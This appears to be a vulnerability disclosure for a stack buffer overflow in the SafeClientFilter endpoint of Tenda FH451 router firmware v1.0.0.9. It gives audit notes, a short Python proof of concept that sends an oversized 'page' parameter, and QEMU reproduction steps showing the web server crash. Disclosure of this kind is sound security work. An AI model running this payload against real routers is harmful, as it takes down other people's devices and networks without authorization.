# Stack Overflow Vulnerability in Tenda FH451 Router (v1.0.0.9) â€“ SafeClientFilter Component

**Vendor**: Shenzhen Jixiang Tenda Technology Co., Ltd.
**Affected Firmware**: [Download Link](https://tenda.com.cn/material/show/101629)
**Vulnerability URL**: `http://192.168.200.1:80/goform/SafeClientFilter`
**Vulnerability File**: `/bin/httpd`

## Vulnerability Description

Through code auditing, a critical security risk has been identified in the `SafeClientFilter` routing function (Line 35) . 

![image](https://github.com/user-attachments/assets/7eb0e894-3bf6-4c6b-8ff3-907ff5fa55b9)

Specifically, the program retrieves the input parameter "page" but lacks proper validation for its numerical range (Line 39).

![image](https://github.com/user-attachments/assets/1ca42e07-1aac-4a30-aac5-4201dbe39925)

Cross-referenced to the function `sub_64EAC`, with attention to lines 44 and 47.

![image](https://github.com/user-attachments/assets/7ec64dee-0dad-4336-b115-b9eeb2814f97)

The path of the webpage where the vulnerability occurs is known to be `goform/SafeClientFilter`.

## PoC 

```python
import requests

url = "http://192.168.200.1:80/goform/SafeClientFilter"

payload = {
   'page': b'a'*(0x100000)
}

res = requests.post(url=url, data=payload)
print("Status Code:", res.status_code)
print("Response:", res.text)
```

## Reproduction Steps

**1. Environment Setup**:
Simulate the router firmware using QEMU

![image](https://github.com/user-attachments/assets/d669f0aa-969e-427f-aa53-5e611b5ee001)

**2. Router Initialization**:
Ensure the router is running and accessible via `http://192.168.200.1`.

![image](https://github.com/user-attachments/assets/0b680091-a361-4fa4-8d29-4902adf909e4)

**3. Exploit Execution**:
Run the PoC script. The router will crash, rendering the web interface inaccessible.



![image](https://github.com/user-attachments/assets/0dd996b9-9948-4423-bb0f-ddafbbdff0d2)

![image](https://github.com/user-attachments/assets/e199d564-9d78-462f-8d6a-ece3f95f6732)



The router has crashed, and the web interface is also inaccessible.

## Impact 

Remote attackers can exploit this vulnerability to crash the router (`httpd` process) or potentially execute arbitrary code.
